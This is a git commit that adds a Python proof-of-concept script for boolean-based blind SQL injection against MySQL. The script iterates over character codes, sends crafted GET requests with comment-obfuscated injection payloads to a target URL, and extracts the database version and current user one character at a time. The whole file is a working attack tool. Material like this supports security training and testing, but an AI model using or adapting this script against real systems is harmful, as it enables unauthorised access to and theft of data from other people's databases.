b857d7a4583ad61aa764f496bc332fa6e562f8c9
Kali <andreyko031096@yandex.ru>
2021-11-04 14:35:57 -0400

    initial

---
+++ mysql_bb_poc.py
@@ -0,0 +1,38 @@
+import sys
+import requests
+
+def sqli(entry_point, inj_str):
+    # search for characters in printable ASCII range
+    for j in range(32, 126): 
+        target = entry_point + inj_str.replace("[CHAR]", str(j)) 
+        r = requests.get(target)
+        # Checking response for boolean answer 
+        # For this example we are assuming non-zero response means True
+        if len(r.text) > 0 :
+            return j 
+    return None
+
+def main():
+    if len(sys.argv) != 2:
+        print("(+) usage: %s <target> <injection_string>" % sys.argv[0])
+        print('(+) eg: %s 192.168.1.100?param= ' %sys.argv[0])
+    entry_point = sys.argv[1] 
+    print("(+) Retrieving database version....")
+    # 19 is length of the version() string
+    for i in range(1, 20): 
+        injection_string = "test')/**/or/**/(ascii(substring((select/**/version()),%d,1)))=[CHAR]%%23" % i 
+        extracted_char = chr(sqli(entry_point, injection_string)) 
+        print(extracted_char, end='', flush=True)
+    print("\n(+) Retrieving username....")
+    #16 is the maximum length of username
+    for i in range(1, 17):
+        injection_string = "test')/**/or/**/(ascii(substring((select/**/user()),%d,1)))=[CHAR]%%23" % i 
+        try:
+            extracted_char = chr(sqli(entry_point, injection_string)) 
+            print(extracted_char, end='', flush=True)
+        except TypeError:
+            break
+    print("\n(+) done!")
+
+if __name__ == "__main__":
+    main()
